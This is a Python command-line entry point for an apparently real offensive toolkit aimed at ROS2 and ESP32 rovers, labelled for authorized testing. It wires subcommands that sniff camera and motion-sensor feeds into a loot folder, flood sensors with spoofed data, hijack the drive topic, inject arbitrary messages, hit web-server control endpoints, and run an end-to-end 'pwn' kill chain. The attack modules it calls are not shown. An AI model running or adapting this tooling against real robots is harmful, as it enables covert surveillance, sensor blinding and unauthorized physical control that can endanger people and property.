"""Rossy CLI — ties recon + graph backends + attacks + web vector together.

Subcommands:
  recon     network sweep to find the rover & its control planes
  scan      enumerate + classify the ROS2 graph (nodes/topics/services)
  sniff     eavesdrop camera / PIR topics (saves frames to ./loot)
  jam       flood a camera / PIR topic with spoofed samples
  teleop    hijack the drive topic (scripted or interactive WASD)
  shutdown  escalating kill chain over the ROS2 graph
  web       ESP32 Arduino web-server vector: discover / drive / camera / shutdown
  pwn       scripted end-to-end demo (recon -> scan -> jam -> teleop -> shutdown)

Backend selection is global to the graph subcommands:
  (nothing)            native rclpy if a ROS2 env is sourced, else error
  --rosbridge H[:9090] use rosbridge websocket (no ROS2 install needed)
  --domain N           set ROS_DOMAIN_ID for native DDS
"""
from __future__ import annotations
import argparse, sys
from . import util


def _add_backend_args(p):
    p.add_argument("--rosbridge", metavar="HOST[:9090]",
                   help="use rosbridge websocket backend instead of native DDS")
    p.add_argument("--domain", type=int, default=None,
                   help="ROS_DOMAIN_ID for native DDS (default 0)")
    p.add_argument("--peers", metavar="IP[,IP...]",
                   help="native DDS unicast peers (e.g. a Tailscale 100.x IP) for off-network reach")
    p.add_argument("--discovery-server", metavar="IP:PORT",
                   help="Fast DDS discovery server endpoint for off-network native DDS")

def _connect(args):
    from . import backends
    return backends.connect(rosbridge=getattr(args, "rosbridge", None),
                            domain_id=getattr(args, "domain", None),
                            peers=getattr(args, "peers", None),
                            discovery_server=getattr(args, "discovery_server", None))


def build_parser():
    ap = argparse.ArgumentParser(
        prog="rossy",
        description="ROS2 / ESP32-S3 rover offensive toolkit (authorized testing only).")
    ap.add_argument("--no-banner", action="store_true")
    sub = ap.add_subparsers(dest="cmd", required=True)

    r = sub.add_parser("recon", help="network sweep for the rover")
    r.add_argument("target", help="IP, host, or CIDR (e.g. 192.168.1.0/24)")
    r.add_argument("-t", "--timeout", type=float, default=0.6)
    r.add_argument("-w", "--workers", type=int, default=256)

    s = sub.add_parser("scan", help="enumerate & classify the ROS2 graph")
    _add_backend_args(s)

    sn = sub.add_parser("sniff", help="eavesdrop camera / PIR topics")
    _add_backend_args(sn)
    sn.add_argument("--kinds", default="camera,pir", help="comma list: camera,pir,drive,state")
    sn.add_argument("--camera", help="override camera topic name")
    sn.add_argument("--pir", help="override PIR topic name")
    sn.add_argument("--drive", help="override drive topic name")
    sn.add_argument("-d", "--duration", type=float, default=20.0)

    j = sub.add_parser("jam", help="flood a sensor topic with spoofed data")
    _add_backend_args(j)
    j.add_argument("kind", choices=["camera", "pir"], help="what to jam")
    j.add_argument("--topic", help="override target topic name")
    j.add_argument("--rate", type=float, default=30.0, help="spoof publish Hz")
    j.add_argument("-d", "--duration", type=float, default=30.0)
    j.add_argument("--mode", default="black",
                   help="camera: black|white ; pir: always-on|always-off")

    t = sub.add_parser("teleop", help="hijack the drive topic")
    _add_backend_args(t)
    t.add_argument("--topic", help="override drive topic (e.g. /cmd_vel)")
    t.add_argument("--linear", type=float, default=0.3)
    t.add_argument("--angular", type=float, default=0.0)
    t.add_argument("--rate", type=float, default=10.0)
    t.add_argument("-d", "--duration", type=float, default=5.0)
    t.add_argument("-i", "--interactive", action="store_true", help="WASD keyboard drive")

    sd = sub.add_parser("shutdown", help="escalating kill chain over the graph")
    _add_backend_args(sd)
    sd.add_argument("--topic", help="override drive topic for zero-velocity hold")
    sd.add_argument("-d", "--duration", type=float, default=5.0)

    inj = sub.add_parser("inject", help="publish a crafted message to ANY topic (robot-agnostic)")
    _add_backend_args(inj)
    inj.add_argument("topic", help="target topic (e.g. /cmd_vel or /patrolbot/estop)")
    inj.add_argument("--type", dest="mtype", help="message type (auto-detected from the graph if omitted)")
    inj.add_argument("--preset", help="drive|stop|spin|true|false|zero|text|black")
    inj.add_argument("--set", dest="sets", action="append", metavar="key=val",
                     help="field override, dot-path, repeatable: --set linear.x=0.5 --set data=true")
    inj.add_argument("--rate", type=float, default=0.0, help="flood Hz (0 = send once)")
    inj.add_argument("-d", "--duration", type=float, default=3.0)
    inj.add_argument("--once", action="store_true", help="send a single message")

    w = sub.add_parser("web", help="ESP32 Arduino web-server vector")
    wsub = w.add_subparsers(dest="webcmd", required=True)
    wd = wsub.add_parser("discover", help="fingerprint + infer control API")
    wd.add_argument("host", help="ESP32 IP or http://IP[:port]")
    wdr = wsub.add_parser("drive", help="send a direction command")
    wdr.add_argument("host")
    wdr.add_argument("direction", choices=["forward", "backward", "left", "right", "stop"])
    wdr.add_argument("--endpoint", help="override endpoint path")
    wdr.add_argument("--param", help="override query/body param name")
    wdr.add_argument("--value", help="override param value")
    wdr.add_argument("--method", choices=["GET", "POST"], help="override HTTP method")
    wc = wsub.add_parser("camera", help="tap MJPEG stream -> ./loot")
    wc.add_argument("host")
    wc.add_argument("--stream", help="stream path (e.g. :81/stream or /mjpeg)")
    wc.add_argument("-d", "--duration", type=float, default=5.0)
    ws = wsub.add_parser("shutdown", help="hit an off/stop endpoint")
    ws.add_argument("host")
    ws.add_argument("--endpoint", help="override endpoint path")

    pw = sub.add_parser("pwn", help="scripted end-to-end demo")
    _add_backend_args(pw)
    pw.add_argument("--web", help="ESP32 web host for the web-vector steps")
    pw.add_argument("--drive-topic", help="override drive topic")
    pw.add_argument("--dry-run", action="store_true", help="recon+scan only, no disruptive steps")

    return ap


def main(argv=None):
    args = build_parser().parse_args(argv)
    if not getattr(args, "no_banner", False):
        util.banner()

    if args.cmd == "recon":
        from . import netscan
        netscan.run(args.target, args.timeout, args.workers)
        return 0

    if args.cmd == "web":
        from . import webctl
        if args.webcmd == "discover":
            webctl.discover(args.host)
        elif args.webcmd == "drive":
            spec = webctl.discover(args.host).get("spec") if not args.endpoint else None
            webctl.drive(args.host, args.direction, spec=spec, endpoint=args.endpoint,
                         param=args.param, value=args.value, method=args.method)
        elif args.webcmd == "camera":
            webctl.camera(args.host, stream_path=args.stream, seconds=args.duration)
        elif args.webcmd == "shutdown":
            webctl.shutdown(args.host, endpoint=args.endpoint)
        return 0

    # ---- graph-backed subcommands ----
    from . import attacks
    try:
        be = _connect(args)
    except Exception as e:
        util.err(str(e))
        return 2
    try:
        if args.cmd == "scan":
            attacks.graph_scan(be)
        elif args.cmd == "sniff":
            overrides = {"camera": args.camera, "pir": args.pir, "drive": args.drive}
            attacks.sniff(be, [k.strip() for k in args.kinds.split(",")], overrides, args.duration)
        elif args.cmd == "jam":
            attacks.jam(be, args.kind, args.topic, args.rate, args.duration, args.mode)
        elif args.cmd == "teleop":
            attacks.teleop(be, args.topic, args.linear, args.angular,
                           args.rate, args.duration, args.interactive)
        elif args.cmd == "shutdown":
            attacks.shutdown(be, args.topic, args.duration)
        elif args.cmd == "inject":
            attacks.inject(be, args.topic, args.mtype, args.sets, args.preset,
                           args.rate, args.duration, args.once)
        elif args.cmd == "pwn":
            _pwn(args, be)
    finally:
        be.close()
    return 0


def _pwn(args, be):
    from . import attacks, webctl
    util.rule("PWN — END TO END")
    info = attacks.graph_scan(be)
    if args.dry_run:
        util.ok("dry run: recon+scan only, stopping before disruptive steps")
        return
    buckets = info["buckets"]
    if buckets["camera"]:
        attacks.jam(be, "camera", None, 30.0, 6.0, "black")
    if buckets["pir"]:
        attacks.jam(be, "pir", None, 20.0, 6.0, "always-off")
    if buckets["drive"] or args.drive_topic:
        attacks.teleop(be, args.drive_topic, 0.3, 0.6, 10.0, 4.0, False)
    if args.web:
        webctl.discover(args.web)
        webctl.drive(args.web, "forward")
    attacks.shutdown(be, args.drive_topic, 4.0)
    util.ok("pwn sequence complete")


if __name__ == "__main__":
    sys.exit(main())
